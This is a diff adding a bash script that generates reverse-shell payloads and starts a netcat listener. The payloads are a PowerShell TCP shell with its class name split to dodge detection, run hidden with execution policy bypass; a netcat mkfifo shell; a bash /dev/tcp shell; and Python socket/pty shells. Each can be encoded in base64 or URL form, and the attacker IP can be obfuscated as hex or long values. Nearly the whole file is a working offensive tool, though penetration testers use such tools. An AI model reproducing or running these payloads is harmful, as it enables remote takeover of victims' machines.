@@ -1,0 +1,423 @@
+#!/bin/bash
+#By Andreas Finstad - 4ndr34z
+#Twitter handle: @4nqr34z
+
+### Colors ##
+ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
+GREEN="${ESC}[32m" YELLOW="${ESC}[33m" BLUE="${ESC}[34m" MAGENTA="${ESC}[35m"
+CYAN="${ESC}[36m" WHITE="${ESC}[37m" DEFAULT="${ESC}[39m"
+
+### Color Functions ##
+
+greenprint() { printf "${GREEN}%s${RESET}\n" "$1"; }
+blueprint() { printf "${BLUE}%s${RESET}\n" "$1"; }
+redprint() { printf "${RED}%s${RESET}\n" "$1"; }
+yellowprint() { printf "${YELLOW}%s${RESET}\n" "$1"; }
+magentaprint() { printf "${MAGENTA}%s${RESET}\n" "$1"; }
+cyanprint() { printf "${CYAN}%s${RESET}\n" "$1"; }
+fn_bye() { printf "\n\nShell you later!\n\n"; exit 0; }
+fn_fail() { echo "That is just not an option!" exit 1; }
+#Header
+function header () {
+clear
+yellowprint "
+          _________.__           .__  .__          
+         /   _____/|  |__   ____ |  | |  |   ______
+         \_____  \ |  |  \_/ __ \|  | |  |  /  ___/
+         /        \|   Y  \  ___/|  |_|  |__\___ \ 
+        /_______  /|___|  /\___  >____/____/____  >
+                \/      \/     \/               \/ By 4ndr34z
+        
+"
+}
+
+#Check dependencies
+benc=`which basenc`
+
+if [ "$?" == 1 ]
+then
+      header
+                redprint "$0 depends on basenc and cannot continue.
+Install on Debian: sudo apt install coreutils
+"
+exit
+fi
+
+nc=`which nc`
+
+if [ "$?" == 1 ]
+then
+      header
+                redprint "$0 depends on netcat and cannot continue.
+Install on Debian: sudo apt install netcat
+"
+exit
+fi
+
+rlwrap=`which rlwrap`
+
+if [ "$?" == 1 ]
+then
+      header
+                redprint "$0 depends on rlwrap and cannot continue.
+Install on Debian: sudo apt install rlwrap
+"
+exit
+fi
+
+
+urlencode=`which urlencode`
+
+if [ "$?" == 1 ]
+then
+      header
+                redprint "$0 depends on urlencode and cannot continue.
+Install on Debian: sudo apt install gridsite-clients 
+"
+exit
+fi
+
+#Find IP
+int=$(route | grep '^default' | grep -o '[^ ]*$')
+myip=$(ip -4 a show dev $int |grep inet|awk -F "inet" {'print $2'}|cut -d/ -f1 | xargs)
+myport="4444"
+
+header
+
+function ip2hex () {
+echo -n $1 | awk -F '.' '{printf "0x%x", ($1 * 2^24) + ($2 * 2^16) + ($3 * 2^8) + $4}'
+
+}
+
+function ip2long () {
+echo -n $1 | awk -F '.' '{printf "%d", ($1 * 2^24) + ($2 * 2^16) + ($3 * 2^8) + $4}'
+
+}
+
+function input () {
+header
+read -p "Please enter your listening IP [$myip]: " IP
+IP=${IP:-$myip}
+read -p "Please enter your listening port [$myport]: " PORT
+PORT=${PORT:-$myport}
+HEXIP=$(ip2hex $IP)
+LONGIP=$(ip2long $IP)
+echo -ne "$(blueprint 'Format of IP')
+$(greenprint '1)') Normal
+$(greenprint '2)') Hexadecimal
+$(greenprint '3)') Long
+
+Choose an option [1]:  "
+    read -r -n 1 ans
+
+    case $ans in
+    1)
+        IP=$IP
+        ;;
+    2)
+        IP=$HEXIP
+        ;;
+    3)
+        IP=$LONGIP
+        ;;
+    
+    *)
+        IP=$IP
+        ;;
+    esac
+}
+
+
+
+function powershell () {
+shell="\$tmp= @('sYSteM.nEt.sOc','KEts.tCPClIent');\$tmp2 = [String]::Join('',\$tmp);\$client = New-Object \$tmp2('$IP',$PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + (\$env:UserName) + '@' + (\$env:UserDomain) + ([System.Environment]::NewLine) + (get-location)+'>';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+
+shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64url -w0)
+rev="powershell -W Hidden -noprofile -executionpolicy bypass -NoExit -e ${shell}"
+echo -n $rev | xclip -sel c
+listen
+}
+
+function netcat () {
+header
+rev="rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh"
+if [[ $1 == "url" ]] 
+then
+    rev=$($urlencode $rev)
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$($urlencode $rev)
+    rev=$($urlencode $rev)
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo $rev|$benc --base64url -w0)
+fi
+echo -n $rev | xclip -sel c
+listen
+}
+
+
+
+function bash_i () {
+header
+rev="sh -i >& /dev/tcp/$IP/$PORT 0>&1"
+
+if [[ $1 == "url" ]] 
+then
+    rev=$($urlencode $rev)
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$($urlencode $rev)
+    rev=$($urlencode $rev)
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+fi
+echo -n $rev | xclip -sel c
+listen
+}
+
+
+
+function python () {
+header
+
+
+if [[ $1 == "python" ]] 
+
+then
+    pythonv="python"
+
+elif [[ $1 == "python3" ]] 
+
+then
+    pythonv="python3"
+fi
+
+rev="$pythonv -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"
+
+if [[ $2 == "url" ]] 
+
+then
+
+    rev=$($urlencode $rev)
+
+elif [[ $2 == "urlx2" ]] 
+
+then
+    rev=$($urlencode $rev)
+    rev=$($urlencode $rev)
+fi
+echo -n $rev | xclip -sel c
+listen
+
+}
+
+
+
+
+#Listener
+function listen () {
+header
+printf "The following has been copied to your clipboard:\n\n"
+echo $rev
+printf "\n\n"
+ echo -ne "
+$(blueprint 'Listener')
+$(greenprint '1)') rlwrap netcat
+$(greenprint '2)') netcat
+$(greenprint '3)') no listener
+$(magentaprint '4)') Go Back to Main Menu
+$(redprint '0)') Exit
+Choose an option [1]:  "
+    read -r -n 1 ans
+
+    case $ans in
+    1)
+        printf "\n\n";$rlwrap -cAr $nc -lvnp $PORT
+        ;;
+    2)
+        printf "\n\n";$nc -lvnp $PORT
+        ;;
+    3)
+        exit
+        ;;
+    4)
+        mainmenu
+        ;;
+        
+    0)
+        fn_bye
+        ;;
+    *)
+        printf "\n\n";$rlwrap -cAr $nc -lvnp $PORT
+        ;;
+    esac
+
+}
+
+
+
+
+submenu_bash() {
+header
+    echo -ne "
+$(blueprint 'Bash')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(magentaprint '5)') Go Back to Main Menu
+$(redprint '0)') Exit
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        bash_i
+        ;;
+    2)
+        bash_i "base64"
+        ;;
+    3)
+        bash_i "url"
+        ;;
+    4)
+        bash_i "urlx2"
+        ;;
+    5)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
+submenu_netcat() {
+header
+    echo -ne "
+$(blueprint 'Netcat')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(magentaprint '5)') Go Back to Main Menu
+$(redprint '0)') Exit
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        netcat
+        ;;
+    2)
+        netcat "base64"
+        ;;
+    3)
+        netcat "url"
+        ;;
+    4)
+        netcat "urlx2"
+        ;;
+    5)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
+submenu_python() {
+header
+    echo -ne "
+$(blueprint 'Python')
+$(greenprint '1)') Python3 - No encoding
+$(greenprint '2)') Python3 - URL encoded
+$(greenprint '3)') Python3 - Double URL encoded
+$(greenprint '4)') Python2 - No encoding
+$(greenprint '5)') Python2 - URL encoded
+$(greenprint '6)') Python2 - Double URL encoded
+$(magentaprint '7)') Go Back to Main Menu
+$(redprint '0)') Exit
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        python "python3"
+        ;;
+    2)
+        python "python3" "url"
+        ;;
+    3)
+        python "python3" "urlx2"
+        ;;
+    4)
+        python "python"
+        ;;
+    5)
+        python "python" "url"
+        ;;
+    6)
+        python "python" "urlx2"
+        ;;
+    7)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
+
+
+mainmenu() {
+header
+    echo -ne "
+$(magentaprint 'MAIN MENU')
+$(greenprint '1)') Powershell
+$(greenprint '2)') Netcat
+$(greenprint '3)') Bash
+$(greenprint '4)') Python
+$(redprint '0)') Exit
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        input
+        powershell
+        ;;
+    2)
+        input
+        submenu_netcat
+        ;;
+    3)
+        input
+        submenu_bash
+        ;;
+    4)
+        input
+        submenu_python
+        ;;
+    0)
+        fn_bye
+        ;;
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
+mainmenu
